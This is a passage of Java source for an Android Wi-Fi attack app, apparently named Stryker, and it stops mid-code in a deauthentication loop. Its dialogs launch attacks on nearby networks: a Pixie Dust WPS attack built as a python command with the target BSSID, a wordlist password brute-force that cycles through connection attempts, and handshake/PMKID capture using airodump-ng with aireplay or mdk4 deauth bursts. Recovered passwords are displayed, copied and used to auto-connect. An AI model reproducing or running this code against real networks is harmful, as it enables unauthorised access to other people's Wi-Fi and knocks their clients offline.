package com.zalexdev.stryker.wifi;


import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.Dialog;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Build;
import android.text.Layout;
import android.text.method.ScrollingMovementMethod;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationCompat;
import androidx.recyclerview.widget.RecyclerView;

import com.google.android.material.button.MaterialButton;
import com.google.android.material.card.MaterialCardView;
import com.google.android.material.dialog.MaterialAlertDialogBuilder;
import com.google.android.material.textfield.TextInputEditText;
import com.zalexdev.stryker.MainActivity;
import com.zalexdev.stryker.R;
import com.zalexdev.stryker.custom.WiFINetwork;
import com.zalexdev.stryker.utils.AdvancedProcess;
import com.zalexdev.stryker.utils.AdvancedThread;
import com.zalexdev.stryker.utils.Core;
import com.zalexdev.stryker.utils.SimpleProcess;
import com.zalexdev.stryker.utils.Utils;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashSet;
import java.util.Locale;
import java.util.Objects;
import java.util.Set;
import java.util.Timer;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
    public ArrayList<WiFINetwork> wifilist;
    public Context context;
    public Activity activity;
    public int tag = 0;
    public Timer deauth;
    public Core core;
    public AdvancedProcess pixie = null;
    public AdvancedProcess oneshot = null;
    public AdvancedProcess deauther = null;
    public AdvancedProcess brutepin = null;
    public AdvancedThread handshake = null;
    public AdvancedThread brutepsk = null;
    public AdvancedProcess airodump = null;
    public Timer aireplay;
    public String pinconnect;
    public String wordlistpath;


    public WiFIAdapter(Context context2, Activity mActivity, ArrayList<WiFINetwork> wifi) {
        this(context2, mActivity, wifi, false);
    }

    public WiFIAdapter(Context context2, Activity mActivity, ArrayList<WiFINetwork> wifi,
                       boolean sortByClients) {
        context = context2;
        wifilist = wifi;
        activity = mActivity;
        try {
            if (sortByClients) {
                ScanWifiMonitor.sortByClients(wifi);
            } else {
                wifi.sort(new WiFINetwork.WiFIComporator());
            }
        } catch (Exception ignored) {}
        core = new Core(context2);
    }

    @NonNull
    @Override
    public ViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {
        View v = LayoutInflater.from(context).inflate(R.layout.wifi_item, parent, false);
        return new ViewHolder(v);
    }

    @SuppressLint("SetTextI18n")
    @Override
    public void onBindViewHolder(@NonNull ViewHolder adapter, @SuppressLint("RecyclerView") final int position) {
        WiFINetwork wifi = wifilist.get(position);

        String mac = wifi.getMac();
        if (!core.getBoolean("hide")) {
            adapter.wifi_mac.setText(mac == null ? "" : mac.toUpperCase(Locale.ROOT));
        } else {
            adapter.wifi_mac.setText(Core.HIDDEN_MAC);
        }
        adapter.wifi_name.setText(wifi.getSsid());
        adapter.wifi_name.setSelected(true);

        adapter.five_mark.setVisibility(View.GONE);
        adapter.wps_mark.setVisibility(View.GONE);
        adapter.lock_mark.setVisibility(View.GONE);
        adapter.pixie_mark.setVisibility(View.GONE);
        adapter.key_mark.setVisibility(View.GONE);

        int signalPercent = wifi.getSignalPercent();
        adapter.wifi_power.setText(signalPercent + "%");
        adapter.wifi_power.setTextColor(signalColor(signalPercent));
        if (adapter.icon != null) {
            adapter.icon.setColorFilter(signalColor(signalPercent));
        }

        if (wifi.getIs5hhz()) {
            adapter.five_mark.setVisibility(View.VISIBLE);
        }
        if (wifi.getWps() && !wifi.getBlocked()) {
            adapter.wps_mark.setVisibility(View.VISIBLE);
        } else if (wifi.getBlocked()) {
            adapter.lock_mark.setVisibility(View.VISIBLE);
        }
        if (wifi.getOK()) {
            adapter.key_mark.setVisibility(View.VISIBLE);
        }

        boolean monitorList = core.getBoolean("wifi_scan_monitor");

        // Manufacturer — resolve from OUI DB if still Unknown (monitor scans)
        String vendor = wifi.getVendor();
        if (vendor == null || vendor.isEmpty() || "Unknown".equalsIgnoreCase(vendor)) {
            try {
                String v = core.getVendorByMacFromDB(wifi.getMac());
                if (v != null && !v.isEmpty()) {
                    wifi.setVendor(v);
                    vendor = v;
                }
            } catch (Exception ignored) {}
        }
        if (monitorList) {
            StringBuilder meta = new StringBuilder();
            if (vendor != null && !vendor.isEmpty() && !"Unknown".equalsIgnoreCase(vendor)) {
                meta.append(vendor);
            } else {
                meta.append(context.getString(R.string.wifi_card_unknown_vendor));
            }
            String enc = wifi.getEncryption();
            if (enc != null && !enc.isEmpty()) {
                meta.append(" · ").append(shortEnc(enc));
            }
            adapter.wifi_model.setText(meta.toString());
        } else {
            adapter.wifi_model.setText(vendor == null || vendor.isEmpty()
                    ? context.getString(R.string.wifi_card_unknown_vendor)
                    : vendor);
            if (wifi.getModel() != null && wifi.getModel().length() > 0) {
                adapter.wifi_model.setText(context.getString(R.string.wifi_card_model, wifi.getModel()));
                if (wifi.isVulnerable()) {
                    adapter.pixie_mark.setVisibility(View.VISIBLE);
                }
            }
        }

        if (adapter.wifi_clients != null) {
            int cc = wifi.getClientCount();
            if (monitorList) {
                adapter.wifi_clients.setVisibility(View.VISIBLE);
                StringBuilder line = new StringBuilder();
                line.append(cc).append(cc == 1 ? " client" : " clients");
                String up = wifi.getUptimeLabel();
                if (!up.isEmpty()) line.append(" · up ").append(up);
                if (wifi.getChannel() > 0) line.append(" · ch ").append(wifi.getChannel());
                adapter.wifi_clients.setText(line.toString());
            } else if (cc > 0) {
                adapter.wifi_clients.setVisibility(View.VISIBLE);
                adapter.wifi_clients.setText(cc + (cc == 1 ? " client" : " clients"));
            } else {
                adapter.wifi_clients.setVisibility(View.GONE);
            }
        }

        if (adapter.divider != null) {
            adapter.divider.setVisibility(position == wifilist.size() - 1 ? View.GONE : View.VISIBLE);
        }

        adapter.card.setOnClickListener(view -> newWifiDialog(wifilist.get(position)));
    }

    private static String shortEnc(String enc) {
        if (enc == null) return "";
        String e = enc.trim();
        if (e.length() <= 28) return e;
        return e.substring(0, 28) + "…";
    }

    private int signalColor(int percent) {
        if (percent >= 65) return android.graphics.Color.parseColor("#2E7D32");
        if (percent >= 40) return android.graphics.Color.parseColor("#F57C00");
        return android.graphics.Color.parseColor("#C62828");
    }
    public void resizeImage(ImageView imageView, ProgressBar circle, boolean s) {
        if (s) {
        core.scale(imageView,0.65F);
        core.scale(circle,1.0F);}
        else {
            core.scale(imageView,1.0F);
            core.scale(circle,0.0F);
        }
    }


    @Override
    public int getItemCount() {
        return wifilist.size();
    }
    public void smoothScrool(TextView outputtext){
        if (outputtext != null) {
            int lineCount = outputtext.getLineCount();
            if (lineCount > 100) {
                outputtext.setText("");
            }
            Layout layout = outputtext.getLayout();
            if (layout != null) {
                final int scrollAmount = layout.getLineTop(outputtext.getLineCount()) - outputtext.getHeight();
                outputtext.scrollTo(0, Math.max(scrollAmount, 0));
            }
        }
    }

    public void newWifiDialog(WiFINetwork network){
        final Dialog dialog = new Dialog(context);
        dialog.setContentView(R.layout.new_wifi_dialog);
        android.view.Window window = dialog.getWindow();
        if (window != null) {
            window.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
            window.setLayout(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        }

        dialog.setCancelable(true);
        TextView name = dialog.findViewById(R.id.ssid);
        TextView mac = dialog.findViewById(R.id.mac);
        TextView model = dialog.findViewById(R.id.model);
        TextView info_text = dialog.findViewById(R.id.additional_text);
        ImageView info_image = dialog.findViewById(R.id.additional_img);
        LinearLayout wps_divider = dialog.findViewById(R.id.wps_divider);
        MaterialCardView pixie = dialog.findViewById(R.id.pixie_dust);
        MaterialCardView deauther = dialog.findViewById(R.id.deauth);
        MaterialCardView try_handshake = dialog.findViewById(R.id.handshake_capture);
        MaterialCardView custom_pin = dialog.findViewById(R.id.custom_pin);
        MaterialCardView brute_psk = dialog.findViewById(R.id.pass_bruteforce);
        MaterialCardView brute_pincode = dialog.findViewById(R.id.pin_bruteforce);
        MaterialCardView common_pins = dialog.findViewById(R.id.common_pins);
        MaterialCardView pmkid_capture = dialog.findViewById(R.id.pmkid_capture);
        MaterialCardView info = dialog.findViewById(R.id.additional_info);
        MaterialCardView wps_lock = dialog.findViewById(R.id.wps_locked);

        pmkid_capture.setOnClickListener(view -> {
            new MaterialAlertDialogBuilder(context)
                    .setTitle("PMKID Capture")
                    .setMessage("Pmkid capture are included into HS Capture attack. Please use HS Capture instead of PMKID Capture.")
                    .setPositiveButton(android.R.string.ok, (dialog1, which) -> {
                        dialog1.dismiss();
                    })
                    .setNegativeButton(android.R.string.cancel, (dialog12, which) -> dialog12.dismiss())
                    .show();
        });
        if (!network.getBlocked()){
            wps_lock.setVisibility(View.GONE);
        }
        else {
            wps_lock.setVisibility(View.VISIBLE);
        }
        if (!network.getWps()){
            wps_lock.setVisibility(View.GONE);
            wps_divider.setVisibility(View.GONE);
        }

        wps_lock.setOnClickListener(view -> {
            MaterialAlertDialogBuilder d = new MaterialAlertDialogBuilder(context)
                    .setTitle("WPS Locked")
                    .setMessage("Stryker detected that this network is WPS Locked. This means that you can't use WPS to connect to this network. You can still try wps attacks, but they will fail.")
                    .setPositiveButton(android.R.string.ok, (dialog1, which) -> dialog1.dismiss());
            d.show();
        });


        name.setText(network.getSsid());
        if (core.getBoolean("hide")){
            mac.setText(Core.HIDDEN_MAC);
        }else{
            mac.setText(network.getMac().toUpperCase(Locale.ROOT));
        }

        TextView dialogClients = dialog.findViewById(R.id.dialog_clients);
        if (dialogClients != null) {
            int cc = network.getClientCount();
            boolean mon = core.getBoolean("wifi_scan_monitor");
            if (cc > 0 || mon) {
                dialogClients.setVisibility(View.VISIBLE);
                StringBuilder sb = new StringBuilder();
                sb.append(cc).append(cc == 1 ? " client connected" : " clients connected");
                if (network.getChannel() > 0) sb.append(" · ch ").append(network.getChannel());
                String up = network.getUptimeLabel();
                if (!up.isEmpty()) sb.append(" · up ").append(up);
                String enc = network.getEncryption();
                if (enc != null && !enc.isEmpty()) sb.append("\n").append(shortEnc(enc));
                String vendor = network.getVendor();
                if (vendor == null || vendor.isEmpty() || "Unknown".equalsIgnoreCase(vendor)) {
                    try {
                        String v = core.getVendorByMacFromDB(network.getMac());
                        if (v != null && !v.isEmpty()) {
                            network.setVendor(v);
                            vendor = v;
                        }
                    } catch (Exception ignored) {}
                }
                if (vendor != null && !vendor.isEmpty() && !"Unknown".equalsIgnoreCase(vendor)) {
                    sb.append("\n").append(vendor);
                }
                dialogClients.setText(sb.toString());
            } else {
                dialogClients.setVisibility(View.GONE);
            }
        }

        info.setOnClickListener(v -> {
            StringBuilder info1 = new StringBuilder();
            if (network.getOK()){
                info1.append("===============\n\nStored Password: ").append(network.getPsk()).append("\n\n===============\n\n\n");
            }
            for (String s : network.getInfo()){
                info1.append(s.trim().replace("*","    -")).append("\n");
            }
            MaterialAlertDialogBuilder d = new MaterialAlertDialogBuilder(context)
                    .setTitle("Additional info")
                    .setMessage(info1)
                    .setPositiveButton(android.R.string.ok, (dialog1, which) -> dialog1.dismiss());
            if(network.getOK()){
                d.setNeutralButton("Copy psk", (dialog1, which) -> {
                    ClipboardManager clipboard = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
                    ClipData clip = ClipData.newPlainText("password", network.getPsk());
                    clipboard.setPrimaryClip(clip);
                    Toast.makeText(context, "Password copied to clipboard", Toast.LENGTH_SHORT).show();
                    dialog1.dismiss();
                });
            }
            d.setNegativeButton("Copy", (dialog1, which) -> {
                ClipboardManager clipboard = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
                ClipData clip = ClipData.newPlainText("info", info1);
                clipboard.setPrimaryClip(clip);
                Toast.makeText(context, "Info copied to clipboard", Toast.LENGTH_SHORT).show();
                dialog1.dismiss();
            });
            d.show();

        });

        if (network.getSsid().contains("Hidden network")){brute_psk.setVisibility(View.GONE);}

        if (network.getModel()!=null){
            model.setText(network.getModel());
        }else {
            model.setVisibility(View.GONE);
        }
        pixie.setOnClickListener(view -> {
            attackDialog(network,1);
        });
        brute_psk.setOnClickListener(view -> {
            attackDialog(network,2);
        });
        try_handshake.setOnClickListener(view -> {
            new MaterialAlertDialogBuilder(context)
                    .setTitle(R.string.hs_deauth_method_title)
                    .setItems(new CharSequence[]{
                            context.getString(R.string.hs_deauth_aireplay),
                            context.getString(R.string.hs_deauth_mdk4)
                    }, (d, which) -> {
                        core.putString("hs_deauth_method", which == 1 ? "mdk4" : "aireplay");
                        attackDialog(network, 3);
                    })
                    .setNegativeButton(R.string.cancel, null)
                    .show();
        });
        brute_pincode.setOnClickListener(view -> {
            attackDialog(network,4);
        });
        custom_pin.setOnClickListener(view -> {
            attackDialog(network,5);
        });
        common_pins.setOnClickListener(view -> {

            attackDialog(network,6);
        });
        deauther.setOnClickListener(view -> {
            attackDialog(network, 7);
        });


        dialog.show();

        }

    public void attackDialog(WiFINetwork network, int type){

        final Dialog dialog = new Dialog(context);
        dialog.setContentView(R.layout.wifi_dialog_attack);
        android.view.Window window = dialog.getWindow();
        if (window != null) {
            window.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
            window.setLayout(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        }
        dialog.setCancelable(false);
        TextView name = dialog.findViewById(R.id.wifi_name);
        TextView clientsLabel = dialog.findViewById(R.id.wifi_clients);
        TextView mac = dialog.findViewById(R.id.wifi_mac);
        TextView model = dialog.findViewById(R.id.wifi_model);
        TextView cancel = dialog.findViewById(R.id.wifi_cancel);
        TextView outputtext = dialog.findViewById(R.id.wifi_output);
        TextView resulttext = dialog.findViewById(R.id.wifi_result);

        TextView autoconnect = dialog.findViewById(R.id.wifi_autoconnect);
        ImageView wifiimg = dialog.findViewById(R.id.wifi_img);
        ProgressBar attack_progress = dialog.findViewById(R.id.attacking_progress);
        outputtext.setMovementMethod(new ScrollingMovementMethod());
        View outputcard = dialog.findViewById(R.id.output_card);

        name.setText(network.getSsid());
        mac.setText(network.getMac());
        if (core.getBoolean("hide")){
            mac.setText(Core.HIDDEN_MAC);
        }

        if (network.getModel()!=null){
            model.setText(network.getModel());
        }else {
            model.setVisibility(View.GONE);
        }

        // Show known clients under SSID (deauth / handshake refresh live)
        if (clientsLabel != null) {
            if (type == 3 || type == 7) {
                seedClientsLabel(clientsLabel, network);
            } else {
                clientsLabel.setVisibility(View.GONE);
            }
        }
        final boolean[] finished = {false};
        cancel.setOnClickListener(view -> {
            finished[0] = true;
            dialog.dismiss();
            if (pixie != null) {pixie.kill();}
            if (handshake != null) {handshake.setCanceled(true);}
            if (oneshot != null) {oneshot.kill();}
            if (brutepsk != null) {brutepsk.setCanceled(true);}
            if (brutepin != null) {brutepin.kill();}
            if (deauther != null) {deauther.kill();}
            if (airodump != null) {airodump.kill();}
            try{
                aireplay.cancel();
            }catch (Exception ignored){

            }
            new Thread(() -> {
                try {
                    core.killWifiAttackTools();
                } catch (Exception ignored) {
                }
                if (core.monitorManager.isMonitorModeEnabled(core.getHSInterface())) {
                    core.toaster(activity, "Disabling monitor mode...");
                    core.monitorManager.disableMonitorMode(core.getHSInterface());
                    core.monitorManager.disableMonitorMode(core.getDeauthInterface());
                }
                restoreWpsInterface();
        }).start();



        });

        dialog.show();
        if (type == 1){
            final int[] scanCount = {0};
            core.wpsDisableWifiIfEnabled();
            String cmd = "python3 -u /CORE/PixieWps/pixie.py -i " + core.getWPSInterface()
                    + " --pixie-force" + core.wpsIfaceDownFlag() + " -K -F -b " + network.getMac();
            pixie = new AdvancedProcess(activity, context, cmd, true) {
                @Override
                public void onFinished(ArrayList<String> outputList) {
                    restoreWpsInterface();
                    WiFINetwork result = pixie(outputList);
                    cancel.setText(android.R.string.ok);
                    outputcard.setVisibility(View.GONE);
                    resulttext.setVisibility(View.VISIBLE);
                    core.scale(wifiimg, 1.0F);
                    core.scale(attack_progress, 0.0F);
                    if (result.getOK()){
                        if (core.isStoreEnabled()) {
                            core.saveNetwork(network.getMac(),result.getPsk(),result.getPin(),network.ssid);
                        }
                        com.zalexdev.stryker.geomac.GeoHooks.recordPixie(
                                context, network.getMac(), network.ssid);
                        String sb = context.getResources().getString(R.string.pass) + " " +
                                result.getPsk() +
                                "\n" +
                                context.getResources().getString(R.string.piin) + " " +
                                result.getPin();
                        resulttext.setText(sb);
                        autoconnect.setVisibility(View.VISIBLE);
                        autoconnect.setOnClickListener(view -> {
                            autoconnect.setText("Trying to connect, please wait...");
                            core.connectWiFi2(network.getSsid(),result.getPsk());
                            core.connectWiFi2(network.getSsid(),result.getPsk());
                            new Thread(() -> {
                                long end = System.currentTimeMillis() + 10000;
                                String iface = core.getWPSInterface();
                                while (System.currentTimeMillis() < end) {
                                    try {
                                        String connectedNetwork = core.customChrootCommand("iw dev " + iface + " link | awk '/SSID/ {print $NF}'").get(0);
                                        if (connectedNetwork.equals(network.getSsid())) {
                                            activity.runOnUiThread(() -> autoconnect.setText("Network connected successfully!"));
                                        }
                                    } catch (Exception ignored) {
                                        return;
                                    }
                                }
                                activity.runOnUiThread(() -> core.toaster("The network wait time was longer than expected."));
                            }).start();
                        });
                    }else if (Core.contains(outputList,"Unable to up interface") || Core.contains(outputList,"No such device")){
                        resulttext.setText("Please change interface before attacking");

                    }else {
                        resulttext.setText(context.getResources().getString(R.string.not_vuln_pixie));
                    }
                }

                @Override
                public void onNewLine(String line) {

                    if (line.contains("WPA PSK:")){
                        process.destroy();
                    }
                    if (line.contains("Associating with AP…")){
                        scanCount[0]++;
                    }
                    if (scanCount[0] > 3){
                        process.destroy();
                    }
                    if(core.getBoolean("hide")){
                        Matcher m = Pattern.compile("((\\w{2}:){5}\\w{2})").matcher(line);
                        if (m.find()){
                            line = line.replace(m.group(), Core.HIDDEN_MAC);
                        }
                    }
                    outputtext.append(line + "\n");
                    smoothScrool(outputtext);
                }

                @Override
                public void onEvent(String line) {

                }
            };

        }
        else if (type == 2){
            AtomicBoolean selected = new AtomicBoolean(false);
            WiFINetwork result = new WiFINetwork();
            ArrayList<String> get = core.getListFiles(core.getStorage() + "Stryker/wordlists/");
            if (!get.isEmpty()){
                String[] w2 = new String[get.size()];
                for (int i = 0; i < get.size(); i++) {
                    w2[i] = get.get(i).replace(core.getStorage() + "Stryker/wordlists/", "");
                }
                new MaterialAlertDialogBuilder(context)
                        .setTitle(R.string.select_word2)
                        .setItems(w2, (dialogInterface, i) -> {
                            wordlistpath = get.get(i);
                            selected.set(true);
                            brutepsk = new AdvancedThread(activity, context) {
                                @Override
                                public void onFinished() {
                                    core.scale(wifiimg,1.0F);
                                    core.scale(attack_progress,0.0F);
                                    resulttext.setVisibility(View.VISIBLE);
                                    outputcard.setVisibility(View.GONE);
                                    cancel.setText(android.R.string.ok);
                                    if (result.getOK()){
                                        String sb = context.getResources().getString(R.string.pass) + " " +
                                                result.getPsk() +
                                                "\n";
                                        resulttext.setText(sb);
                                        autoconnect.setVisibility(View.VISIBLE);
                                        autoconnect.setOnClickListener(view -> {
                                            autoconnect.setText("Trying to connect, please wait...");
                                            core.connectWiFi2(network.getSsid(),result.getPsk());
                                            core.connectWiFi2(network.getSsid(),result.getPsk());
                                            new Thread(() -> {
                                                long end = System.currentTimeMillis() + 10000;
                                                String iface = core.getWPSInterface();
                                                while (System.currentTimeMillis() < end) {
                                                    try {
                                                        String connectedNetwork = core.customChrootCommand("iw dev " + iface + " link | awk '/SSID/ {print $NF}'").get(0);
                                                        if (connectedNetwork.equals(network.getSsid())) {
                                                            activity.runOnUiThread(() -> autoconnect.setText("Network connected successfully!"));
                                                        }
                                                    } catch (Exception ignored) {
                                                        return;
                                                    }
                                                }
                                                activity.runOnUiThread(() -> core.toaster("The network wait time was longer than expected."));
                                            }).start();
                                        });
                                    }else {
                                        resulttext.setText("Password not found");
                                    }
                                }

                                @Override
                                public void eventListener(String line) {
                                    outputtext.append(line + "\n");
                                    smoothScrool(outputtext);
                                }

                                @Override
                                public void doOnBackground() {
                                    File wlFile;
                                    if (wordlistpath != null && wordlistpath.startsWith("/")) {
                                        wlFile = new File(wordlistpath);
                                    } else {
                                        wlFile = new File(core.getStorage() + "Stryker/wordlists/" + wordlistpath);
                                    }
                                    if (!wlFile.exists()) {
                                        sendEvent("Wordlist not found: " + wlFile.getAbsolutePath());
                                        return;
                                    }
                                    sendEvent("PSK attack (no monitor) · " + wlFile.getName());
                                    try (BufferedReader br = new BufferedReader(new FileReader(wlFile))) {
                                        String psk;
                                        while ((psk = br.readLine()) != null) {
                                            if (this.canceled) { break; }
                                            psk = psk.trim();
                                            if (psk.isEmpty()) continue;
                                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                                createBruteNotification(context.getResources().getString(R.string.trying)+psk,0,1);
                                            }
                                            sendEvent(context.getResources().getString(R.string.trying)+ psk);
                                            int netId = core.connectWiFi2(network.getSsid(), psk);
                                            if (netId == -1) {
                                                sendEvent("addNetwork failed — check WiFi/location permissions");
                                            }
                                            boolean ok = false;
                                            for (int wait = 0; wait < 8 && !this.canceled; wait++) {
                                                try { Thread.sleep(1000); } catch (InterruptedException e) { break; }
                                                if (core.isAssociatedToSsid(network.getSsid())
                                                        || checkIsSsidConnected(network.getSsid())) {
                                                    ok = true;
                                                    break;
                                                }
                                            }
                                            if (ok) {
                                                result.setOK(true);
                                                result.setPsk(psk);
                                                result.setSsid(network.getSsid());
                                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                                    createBruteNotification(context.getResources().getString(R.string.succes)+psk,1,1);
                                                }
                                                sendEvent("Connected with: " + psk);
                                                break;
                                            } else {
                                                core.deleteWifi(netId);
                                            }
                                        }
                                    } catch (IOException e) {
                                        sendEvent("Error: " + e.getMessage());
                                        e.printStackTrace();
                                    }
                                }

                                @Override
                                public void onCanceled() {

                                }
                            };
                        }).setOnDismissListener(dialogInterface -> {
                            if (!selected.get()){
                                dialog.dismiss();
                            }

                        })
                        .show();
              }else{
                outputtext.append("No wordlist found!\nPlease put worldlist in Stryker/wordlists/ and try again!\n");
            }

        }
        else if (type == 3){

            Timer deauthtimer = new Timer();
            final boolean[] hsStatus = {false};
            final boolean[] pmkidStatus = {false};
            final String[] second = {"0s"};
            handshake = new AdvancedThread(activity,context) {
                @Override
                public void onFinished() {
                    core.scale(wifiimg,1.0F);
                    core.scale(attack_progress,0.0F);
                    resulttext.setVisibility(View.VISIBLE);
                    outputcard.setVisibility(View.GONE);
                    cancel.setText(android.R.string.ok);
                    if (hsStatus[0]){
                    resulttext.setText("Handshake captured!\n Check Stryker/captured/ folder");}
                    else if (pmkidStatus[0]){
                        resulttext.setText("PMKID captured!\n Check Stryker/captured/ folder");
                    }
                    else {
                        resulttext.setText("Handshake not captured");
                    }
                }

                @Override
                public void eventListener(String line) {
                    outputtext.append(line + "\n");
                    smoothScrool(outputtext);
                }

                @Override
                public void doOnBackground() {
                    boolean monitor;
                    boolean monitor2 = true;

                    ArrayList<String> clients = new ArrayList<>();
                    if (network.getClients() != null) {
                        for (String c : network.getClients()) {
                            if (c == null) continue;
                            String mac = c.trim().toLowerCase(Locale.US);
                            if (mac.contains(":") && !clients.contains(mac)) {
                                clients.add(mac);
                            }
                        }
                    }
                    if (!clients.isEmpty()) {
                        refreshClientsLabel(clientsLabel, clients);
                    }
                    String scanRaw = core.getString("wlan_scan");
                    String deauthRaw = core.getString("wlan_deauth");
                    if (deauthRaw == null) deauthRaw = "";
                    boolean likelyInternal = deauthRaw.matches("s?wlan0");
                    int channel = network.getChannel();
                    if (channel <= 0) {
                        sendEvent("Invalid channel (" + channel + "). Rescan WiFi and try again.");
                        setCanceled(true);
                        return;
                    }
                    String channelStr = String.valueOf(channel);
                    String bssid = network.getMac();
                    sendEvent("=== Handshake capture ===");
                    sendEvent("Target: " + network.getSsid() + " (" + bssid + ")");
                    sendEvent("Channel: " + channelStr
                            + (Boolean.TRUE.equals(network.getIs5hhz()) ? " · 5 GHz" : " · 2.4 GHz"));
                    if (network.getEncryption() != null && !network.getEncryption().isEmpty()) {
                        sendEvent("Encryption: " + network.getEncryption());
                    }
                    if (network.getVendor() != null && !network.getVendor().isEmpty()
                            && !"Unknown".equalsIgnoreCase(network.getVendor())) {
                        sendEvent("Vendor: " + network.getVendor());
                    }
                    if (!clients.isEmpty()) {
                        sendEvent("Starting with " + clients.size()
                                + " client(s) from monitor scan — will also catch new ones:");
                        for (String c : clients) {
                            sendEvent("  · " + c);
                        }
                    } else {
                        sendEvent("No pre-scanned clients — will discover during capture");
                    }
                    sendEvent("Scan iface pref: " + scanRaw + " · Deauth iface pref: " + deauthRaw);
                    sendEvent("Enabling monitor mode…");
                    if (likelyInternal) {
                        sendEvent("Note: deauth iface is " + deauthRaw
                                + " (no mon rename). Injection may fail on some phones.");
                    }

                    core.customCommand("mkdir -p /sdcard/Stryker/hs /sdcard/Stryker/captured", true);
                    core.deleteFile(core.getStorage()+"Stryker/hs/handshake-01.cap");

                    monitor = core.monitorManager.enableMonitorMode(scanRaw, channelStr);
                    sendEvent("Monitor (scan): " + (monitor ? "OK" : "FAILED") + " on " + scanRaw);
                    if (!scanRaw.equals(deauthRaw)) {
                        monitor2 = core.monitorManager.enableMonitorMode(deauthRaw, channelStr);
                        sendEvent("Monitor (deauth): " + (monitor2 ? "OK" : "FAILED") + " on " + deauthRaw);
                    }

                    String hsIface = core.getHSInterface();
                    String deauthIface = core.getDeauthInterface();
                    sendEvent("Resolved ifaces → listen=" + hsIface + " deauth=" + deauthIface);
                    core.lockWifiChannel(hsIface, channelStr);
                    if (!hsIface.equals(deauthIface)) {
                        core.lockWifiChannel(deauthIface, channelStr);
                    }
                    sendEvent("Locked channel " + channelStr + " on listen/deauth ifaces");

                    final boolean[] airoRunning = {false};
                    WifiDeauthEngine.LineSink sink = this::sendEvent;

                    if (monitor && monitor2){
                        sendEvent("Starting airodump-ng…");
                        new Thread(() -> {
                            String cmd = "airodump-ng " + hsIface
                                    + " -w /sdcard/Stryker/hs/handshake --ignore-negative-one"
                                    + " --output-format pcap -c " + channelStr
                                    + " --bssid " + bssid + " --update 2";
                            if (Boolean.TRUE.equals(network.getIs5hhz())) {
                                cmd += " --band a";
                            }
                            cmd += " 2>&1";
                            sendEvent("[airodump] " + cmd);

                            airodump = new AdvancedProcess(activity, context, cmd, true) {
                                @Override
                                public void onFinished(ArrayList<String> outputList) {
                                    sendEvent("[airodump] exited");
                                }

                                @Override
                                public void onNewLine(String line) {
                                    if (line == null || line.trim().isEmpty()) return;
                                    String raw = line.trim();
                                    if (raw.contains(bssid.toUpperCase())
                                            || raw.contains(bssid)
                                            || raw.contains(bssid.toLowerCase())
                                            || raw.contains(" WPA")
                                            || raw.contains(" PSK")) {
                                        airoRunning[0] = true;
                                    }
                                    if (raw.contains("Elapsed:")) {
                                        Matcher em = Pattern.compile("Elapsed:\\s*([^\\]]+)").matcher(raw);
                                        if (em.find()) second[0] = em.group(1).trim();
                                    }
                                    WifiDeauthEngine.collectClientsFromAirodump(
                                            raw, bssid, clients, msg -> {
                                                // live client discoveries go to the attack log
                                                if (msg != null && msg.contains("client")) {
                                                    sendEvent(msg);
                                                }
                                            });
                                    refreshClientsLabel(clientsLabel, clients);
                                    if (WifiDeauthEngine.lineHasHandshake(raw)) {
                                        sendEvent("[airodump] " + raw);
                                        sendEvent("Handshake seen by airodump!");
                                        hsStatus[0] = true;
                                    } else if (WifiDeauthEngine.lineHasPmkid(raw)) {
                                        sendEvent("[airodump] " + raw);
                                        sendEvent("PMKID seen by airodump!");
                                        pmkidStatus[0] = true;
                                    }
                                }

                                @Override
                                public void onEvent(String line) { }
                            };
                            // Keep airodump lines out of global logger spam; we cherry-pick above
                            airodump.setNoLog(true);
                        }, "hs-airodump").start();

                        sendEvent("Waiting for target beacon on ch " + channelStr + " (up to 60s)…");
                        long waitUntil = System.currentTimeMillis() + 60_000L;
                        while (!airoRunning[0] && System.currentTimeMillis() < waitUntil && !isCanceled()){
                            try {
                                Thread.sleep(1000);
                            } catch (InterruptedException e) {
                                break;
                            }
                        }
                        if (!airoRunning[0]) {
                            sendEvent("Timed out waiting for beacon — check adapter/channel and rescan.");
                            setCanceled(true);
                            return;
                        }
                        String deauthMethod = core.getString("hs_deauth_method");
                        if (deauthMethod == null || deauthMethod.isEmpty()) deauthMethod = "aireplay";
                        sendEvent("Target visible. Deauth method: " + deauthMethod
                                + " · burst every " + WifiDeauthEngine.BURST_INTERVAL_SEC
                                + "s, then wait for HS…");
                        core.lockWifiChannel(deauthIface, channelStr);

                        int round = 0;
                        while (!hsStatus[0] && !pmkidStatus[0] && !isCanceled()) {
                            round++;
                            refreshClientsLabel(clientsLabel, clients);
                            sendEvent("--- deauth round #" + round
                                    + " · clients=" + clients.size()
                                    + (clients.isEmpty() ? "" : " [" + String.join(", ", clients) + "]")
                                    + " · method=" + deauthMethod
                                    + " · elapsed=" + second[0] + " ---");
                            String burstLog;
                            ArrayList<String> snapshot = WifiDeauthEngine.copyClients(clients);
                            if ("mdk4".equalsIgnoreCase(deauthMethod)) {
                                int ch = 0;
                                try { ch = Integer.parseInt(channelStr); } catch (Exception ignored) {}
